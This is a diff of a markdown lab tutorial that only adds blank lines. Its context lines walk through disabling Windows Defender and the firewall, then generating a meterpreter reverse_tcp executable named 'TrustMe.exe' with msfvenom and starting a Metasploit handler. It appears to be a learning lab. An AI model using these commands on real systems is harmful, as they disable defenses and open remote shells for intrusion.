@@ -40,6 +40,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 This will disable **Defender** for this session.
 
 If you get angry red errors, that is **Ok**, it means **Defender** is not running.
+
 <br>
 
 ### Disable Firewall
@@ -48,6 +49,7 @@ Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 ```ps
 netsh advfirewall set allprofiles state off
 ```
+
 <br>
 
 ### Set Administrator Password
@@ -70,6 +72,7 @@ Run the following command to become root:
 ```bash
 sudo su -
 ```
+
 <br>
 
 ### Get Linux IP
@@ -97,6 +100,7 @@ cd /tmp/
 ```bash
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
+
 <hr>
 
 ## Step 2: Starting The Metasploit Handler
@@ -133,6 +137,7 @@ exploit
 It should look like this:
 
 <img width="687" height="206" alt="2026-02-23_15-38" src="https://github.com/user-attachments/assets/71226123-2163-4237-8173-c7586de81ee7" />
+
 <br>
 
 ### Copy The File Over
